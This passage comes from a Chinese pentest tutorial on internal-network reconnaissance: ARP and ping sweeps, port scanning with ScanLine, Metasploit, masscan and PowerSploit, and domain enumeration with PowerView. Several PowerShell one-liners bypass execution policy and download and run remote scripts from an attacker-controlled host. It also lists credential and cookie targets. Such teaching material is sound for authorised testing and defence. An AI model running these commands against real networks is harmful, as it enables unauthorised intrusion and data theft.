通过powershell脚本扫描 IP 地址存活，命令如下：

    
    
    powershell.exe -exec bypass -Command "Import-Module ./Invoke-TSPingSweep.ps1;Invoke-TSPingSweep -StartAddress 10.10.10.0 -EndAddress 10.10.10.255"
    

![image.png](https://image.3001.net/images/20220103/1641154239_61d206bfe135fe39a135e.png!small)

#### 4.5.3 利用arp扫描完整探测内网

1、arp-scan 工具

使用方式：直接把arp.exe上传到目标机器中并运行，可以自定义掩码、指定扫描范围等。命令如下：

    
    
    arp.exe -t 10.10.10.0/24
    

![image.png](https://image.3001.net/images/20220103/1641154244_61d206c4be96f8c6859d9.png!small)

2、Empire中的arpscan模块

使用方式：首先创建一个新的监听器，生成powershell载荷并在目标机器执行获取会话，然后使用empire内置模块即可，命令如下：

    
    
    usemodule situational_awareness/network/arpscan
    info
    set Range 10.10.10.0-10.10.10.254
    execute/run
    

![image.png](https://image.3001.net/images/20220103/1641154251_61d206cb47b47c5c4a86c.png!small)

3、Nishang中的Invoke-ARPScan.ps1脚本

使用方式：使用Nishang中的Invoke-ARPScan.ps1脚本，可以将脚本上传到目标主机中运行，也可以直接远程加载脚本、自定义掩码和扫描范围，命令如下：

    
    
    命令如下：
    A.远程下载运行
    powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString(' http://10.10.10.146:8080/Invoke-ARPScan.ps1');Invoke-ARPScan -CIDR 10.10.10.0/24" >> c:\windows\temp\log.txt
    B.本地运行
    powershell.exe -exec bypass -Command "& {Import-Module C:\windows\temp\Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 10.10.10.0/24}" >> C:\windows\temp\log1.txt
    

运行结果如下：

![image.png](https://image.3001.net/images/20220103/1641154260_61d206d4e123506e97693.png!small)

#### 4.5.4 通过常规TCP/UDP端口扫描探测内网

工具介绍：ScanLine是一款经典的端口扫描工具，可以在所有版本的Windows操作系统中使用，体积小，仅使用单个文件，同时支持TCP/UDP端口扫描。

使用方式：将工具上传至目标系统，运行如下命令：

    
    
    sl -h -t 22,80-89,110,389,445,3389,1099,1433,2049,6379,7001,8080,1521,3306,3389,5432 -u 53,161,137,139 -O c:\windows\temp\sl_res.txt -p 10.10.10.1-254 /b
    

参数解释如下：

    
    
    -?  - Shows this help text
     -b  - Get port banners
     -c  - Timeout for TCP and UDP attempts (ms). Default is 4000
     -d  - Delay between scans (ms). Default is 0
     -f  - Read IPs from file. Use "stdin" for stdin
     -g  - Bind to given local port
     -h  - Hide results for systems with no open ports
     -i  - For pinging use ICMP Timestamp Requests in addition to Echo Requests
     -j  - Don't output "-----..." separator between IPs
     -l  - Read TCP ports from file
     -L  - Read UDP ports from file
     -m  - Bind to given local interface IP
     -n  - No port scanning - only pinging (unless you use -p)
     -o  - Output file (overwrite)
     -O  - Output file (append)
     -p  - Do not ping hosts before scanning
     -q  - Timeout for pings (ms). Default is 2000
     -r  - Resolve IP addresses to hostnames
     -s  - Output in comma separated format (csv)
     -t  - TCP port(s) to scan (a comma separated list of ports/ranges)
     -T  - Use internal list of TCP ports
     -u  - UDP port(s) to scan (a comma separated list of ports/ranges)
     -U  - Use internal list of UDP ports
     -v  - Verbose mode
     -z  - Randomize IP and port scan order
    
    Example: sl -bht 80,100-200,443 10.0.0.1-200
    

运行结果如下：

![image.png](https://image.3001.net/images/20220103/1641154270_61d206de152a9989ea50e.png!small)

### 4.6 域内端口扫描

通过查询目标主机的端口开放信息，不仅可以了解目标主机所开放的服务，还可以找出其开放服务的漏洞、分析目标网络的拓扑结构等，具体需要关注以下三点。

  * 端口的Banner信息。

  * 端口上运行的服务。

  * 常见应用的默认端口。

在进行内网渗测试时，通常会使用Metasploit
内置的端口进行扫描。也可以上传端口扫描工具，使用工具进行扫描。还可以根据服务器的环境，使用自定义的端口扫描脚本进行扫描。在获得授权的情况下，可以直接使用Nmap、masscan
等端口扫描工具获取开放的端口信息。

#### 4.6.1 利用telnet命令进行扫描

Telnet协议是TCP/IP协议族的一员，是Internet远程登录服务的标准协议和主要方式。它为  
用户提供了在本地计算机上完成远程主机工作的能力。在目标计算机上使用Telnet
协议，可以与目标服务器建立连接。如果只是想快速探测某台主机的某个常规高危端口是否开放，使用telnet命令是最方便的。telnet
命令的一个简单的使用示例，如下图。

![image.png](https://image.3001.net/images/20220103/1641154277_61d206e5c229e01afbb1e.png!small)

若端口不存在，则会显示连接失败。

#### 4.6.2 S扫描器

S扫描器是早期的一种快速端口扫描工具，支持大网段扫描,特别适合运行在Windows Sever
2003以下版本的操作系统中。S扫描器的扫描结果默认保存在其安装目录下的result.txt文件中。  
使用方法：将s扫描器上传至目标系统，推荐使用TCP扫描，命令如下：

    
    
    S.exe TCP 10.10.10.1 10.10.10.254 445,3389,1433,7001,1099,8080,80,22,23,21,25,110,3306,5432,1521,6379,2049,111 256 /Banner /save
    

#### 4.6.3 MetaSploit端口扫描

Metasploit不仅提供了多种端口扫描技术,还提供了与其他扫描工具的接口。在msfconsole下运行"search
portscan"命令，即可进行搜索。

![image.png](https://image.3001.net/images/20220103/1641154287_61d206efb04c85f03dc52.png!small)

这里我们选择tcp模式的端口扫描方式，配置参数执行即可：

    
    
    use auxiliary/scanner/portscan/tcp 
    show options
    set RHOSTS 10.10.10.0/24
    run
    

![image.png](https://image.3001.net/images/20220103/1641154294_61d206f66d21ed53cb5ed.png!small)

#### 4.6.4 Invoke-portscan.ps1

通过powerSploit的Invoke-portscan.ps1脚本进行端口扫描，命令如下：

    
    
    powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.146:8080/Invoke-Portscan.ps1');Invoke-Portscan -Hosts 10.10.10.0/24 -T 4 -ports '21,80,88,445,1433,3306,7001,6379' -oA c:\windows\temp\res.txt"
    

运行结果如下：

![image.png](https://image.3001.net/images/20220103/1641154304_61d207000e6992220fd78.png!small)

也可以使用Nishang下的Invoke-PortScan模块，用于发现主机、解析主机名、扫描端口。输人"Get-Help Invoke-PortScan
-full" 命令，即可查看帮助信息。Invoke-PortScan的参数介绍如下：

  * StartAddress: 扫描范围的开始地址。

  * EndAddress: 扫描范围的结束地址。

  * ScanPort: 进行端口扫描。

  * Port: 指定扫描端口。默认扫描的端口有21、22、23、53、69、71、 80、98、110、139、111、389、443、445、 1080、 1433、2001、 2049、3001、3128、5222、 6667、 6868、7777、7878、8080、1521、 3306、3389、5801、5900、5555、5901。

  * TimeOut: 设置超时时间。

使用以下命令对本地局域网进行扫描，搜索存活主机并解析主机名。

    
    
    Invoke-PortScan -StartAddress 10.10.10.1 -EndAddress 10.10.10.255 -ResolveHost -ScanPort
    

![image.png](https://image.3001.net/images/20220103/1641154313_61d207092aa1c6f8c8d9b.png!small)

#### 4.6.5 通过nmap或者masscan

这里以masscan为例,输入如下命令进行端口扫描：

    
    
    masscan -p 1-65535 10.10.10.8 --rate=100
    

![image.png](https://image.3001.net/images/20220103/1641154321_61d20711032bae33d2896.png!small)

#### 4.6.6 端口Banner信息

如果通过扫描发现了端口，可以使用客户端连接工具或者nc,获取服务端的Banner信息。获取Banner信息后，可以在漏洞库中查找对应CVE编号的POC、EXP，在ExploitDB、Seebug等平台上查看相关的漏洞利用工具，然后到目标系统中验证漏洞是否存在，从而有针对性地进行安全加固。相关漏洞的信息，可以参考如下两个网站。

  * [安全焦点](http://www.securityfocus.com/bid)：其中的BugTraq是一个出色的漏洞和Exploit数据源，可以通过CVE编号或者  
产品信息漏洞直接搜索。

  * [Exploit-DB](http://www.exploit-db.com): 取代了老牌安全网站milw0rm,提供了大量的Exploit 程序和相关报告。

常用端口如下：

  * 文件共享服务端口（21、22、69、2049、139、389）

  * 远程连接服务端口（22、23、3389、5900、5632）

  * Web应用服务端口（80、443、8080、7001、7002、8089、9090、4848、1352）

  * 数据库服务端口（3306、1433、1521、5432、6379、5000、9200）

  * 邮件服务端口（25、110、143）

  * 网络常见协议端口（53、67、68、161）

### 4.7 利用PowerShell收集域信息

#### 4.7.1 powershell的简单介绍

PowerShell
是微软推出的一款用于满足管理员对操作系统及应用程序易用性和扩展性需求的脚本环境，可以说是cmd.exe的加强版。微软已经将PowerShell
2.0内置在Windows Server 2008和Windows 7中，将PowerShell 3.0内置在Windows Server 2012和
Windows 8中，将PowerShell4.0内置在Windows Server 2012R2和Windows 8.1中，将PowerShell
5.0内置在Windows Server2016和Windows
10中。PowerShell作为微软官方推出的脚本语言，在Windows操作系统中的强大功能众所周知：系统管理员可以利用它提高Windows管理工作的自动化程度;渗透测试人员可以利用它更好地进行系统安全测试。

#### 4.7.2 powershell的四种执行策略

  * Restricted:默认设置,不允许执行任何脚本。

  * Allsigned:只能运行经过证书验证的脚本。

  * Unrestricted:权限最高，可以执行任意脚本。

  * RemoteSigned:对本地脚本不进行限制;对来自网络的脚本必须验证其签名。

#### 4.7.3 通过powerview获取域内信息

1、查看当执行权限

    
    
    Get-ExecutionPolicy
    

![image.png](https://image.3001.net/images/20220103/1641154335_61d2071f072a9df24c1b3.png!small)

可以看到默认情况下执行权限是Restricted，不允许执行脚本，执行会报错，如下图：

![image.png](https://image.3001.net/images/20220103/1641154339_61d20723be797dc4dfebf.png!small)

2、设置执行权限为Unrestricted，然后输入"Y"

    
    
    Set-ExecutionPolicy Unrestricted
    

![image.png](https://image.3001.net/images/20220103/1641154364_61d2073c03b044c0d212c.png!small)

3、导入脚本

    
    
    import-Module .\powerview.ps1
    

![image.png](https://image.3001.net/images/20220103/1641154359_61d20737408d7509fe0cc.png!small)

4、执行命令获取域内信息

下面是一些常见命令：

![image.png](https://image.3001.net/images/20220103/1641154376_61d207484cd76aed12fb1.png!small)

下面列举几个命令进行演示。

  1. 获取当前用户所在域名称

![image.png](https://image.3001.net/images/20220103/1641154381_61d2074d7c0d427a182ec.png!small)

  2. 返回所有用户详细信息

![image.png](https://image.3001.net/images/20220103/1641154385_61d207519219b34a11029.png!small)

  3. 获取所有域控制器

![image.png](https://image.3001.net/images/20220103/1641154391_61d2075795035bdbfcd2d.png!small)

  4. 获取所有域内机器

![image.png](https://image.3001.net/images/20220103/1641154396_61d2075ce487a8d0c0d27.png!small)

  5. 获取当前域内的网络共享

![image.png](https://image.3001.net/images/20220103/1641154401_61d207617eaa930246703.png!small)

其他命令使用方式类似，大家可以自己进行尝试。

## 五、 敏感数据的防护

内网的核心敏感数据，不仅包括数据库、电子邮件，还包括个人数据及组织的业务数据、技术数据等。可以说，价值较高的数据基本都在内网中。因此，了解攻击者的操作流程，对内网数据安全防护工作至关重要。

### 5.1 资料、数据、文件的定位流程

内网数据防护的第一步，就是要熟悉攻击者获取数据的流程。在实际的网络环境中，攻击者
主要通过各种恶意方法来定位公司内部各相关人员的机器，从而获得资料、数据、文件。定位的大致流程如下。

  * 定位内部人事组织结构。

  * 在内部人事组织结构中寻找需要监视的人员。

  * 定位相关人员的机器。

  * 监视相关人员存放文档的位置。

  * 列出存放文档的服务器的目录。

### 5.2 重点核心业务机器及敏感信息防护

  1. 核心业务机器

  * 高级管理人员、系统管理员、财务/人事/业务人员的个人计算机。

  * 产品管理系统服务器。

  * 办公系统服务器。

  * 财务应用系统服务器。

  * 核心产品源码服务器(IT公司通常会架设自己的SVN或者GIT服务器)。·数据库服务器。

  * 文件服务器、共享服务器。·电子邮件服务器。

  * 网络监控系统服务器。

  * 其他服务器（分公司、工厂).

  2. 敏感信息和敏感文件

  * 站点源码备份文件、数据库备份文件等。

  * 各类数据库的Web管理人口，例如phpMyAdmin、Adminer。

  * 浏览器密码和浏览器Cookie。

  * 其他用户会话、3389和 ipc$连接记录、“回收站”中的信息等。

  * Windows无线密码。

  * 网络内部的各种账号和密码，包括电子邮箱、VPN、FTP、TeamView等。

### 5.3 应用与文件形式信息的防护

在内网中，攻击者经常会进行基于应用与文件的信息收集，包括一些应用的配置文件、敏感文件、密码、远程连接、员工账号、电子邮箱等。从总体来看，攻击者一是要了解已攻陷机器所属人员的职位（一个职位较高的人在内网中的权限通常较高，在他的计算机中会有很多重要的、敏感的个人或公司内部文件)，二是要在机器中使用一些搜索命令来寻找自己需要的资料。  
针对攻击者的此类行为，建议用户在内网中工作时，不要将特别重要的资料存储在公开的计算机中，在必要时应对Office文档进行加密且密码不能过于简单（对于低版本的Office软件，例如Office
2003，攻击者在网上很容易就能找到软件来破解其密码;对于高版本的Office软件，攻击者能够通过微软SysInternals
Suite套件中的ProcDump来获取其密码)。

## 六、分析域内网段划分情况及拓扑结构

### 6.1 基本架构

渗透测试人员需要对目标网站的基本情况进行简单的判断，分析目标服务器所使用的Web服务器、后端脚本、数据库、系统平台等。  
下面列举一些常见的Web架构。

  * ASP + Access + IIS 5.0/6.0 + Windows Sever 2003

  * ASPX + MSSQL+ IIS 7.0/7.5+ Windows Sever 2008

  * PHP + MySQL+ IIS

  * PHP+ MySQL+Apache

  * PHP+MySQL+ Ngnix

  * JSP + MySQL+ Ngnix

  * JSP + MSSQL+Tomcat

  * JSP + Oracle + Tomcat

### 6.2 域内网段划分

在判断内网环境时，首先需要分析内网ip地按址的分布情况。一般可以通过内网中的服务器、交换机等设备，以及snmp、弱口令等，获取内网网络拓扑或dns域传送的信息。  
网段是怎么划分的？ 按照楼层划分网段，还是按照地区划分网段？  
内网通常可分为DMZ、办公区、核心区  
1.DMz  
在实际的渗透测试中，大多数情况下，在**web环境中拿到的权限都在dmz中。这个区域不属于严格意义上的内网。如果访问控制策略配置合理，dmz就会处在从内网能够访问DMz，而从dmz访问不能进入内网的状态。  
2.办公区  
办公区，是指日常工作区。办公区的安全防护水平通常不高，基本的防护机制大多数为杀毒软件或主机入侵检测产品。  
3.核心区  
核心区内一般存放着企业最重要的数据、文档等信息资产（例如域控制器、核心生产机器）安全全设置也最为严格。

### 6.3. 多层域结构

在上述内容的基础中，可以尝试分析域结构

### 6.4. 绘制内网拓扑图

通过目标主机及所在域的各类信息，就可以绘制内网的拓扑图了。

## 七、后语

在下一篇文章中，我将继续为大家介绍内网渗透中令牌的窃取与伪造！

## 八、参考链接

1、《内网安全攻防 渗透测试实战指南》

2、https://www.freebuf.com/articles/web/288119.html

